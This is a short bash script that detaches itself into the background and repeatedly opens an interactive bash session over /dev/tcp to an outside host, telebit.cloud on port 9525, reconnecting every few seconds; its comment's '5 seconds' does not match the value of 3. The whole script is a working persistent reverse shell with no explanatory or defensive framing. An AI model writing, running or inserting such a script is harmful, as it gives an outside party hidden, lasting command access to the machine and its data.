#!/bin/bash

HOST="telebit.cloud"
PORT=9525
RETRY_INTERVAL=3 # 5 seconds

connect() {
    while true; do
        /bin/bash -i >& "/dev/tcp/${HOST}/${PORT}" 0>&1

        sleep $RETRY_INTERVAL
    done
}

if [ "$1" == "--background" ]; then
    connect
else
    nohup /bin/bash "$0" --background > /dev/null 2>&1 &

    exit 0
fi
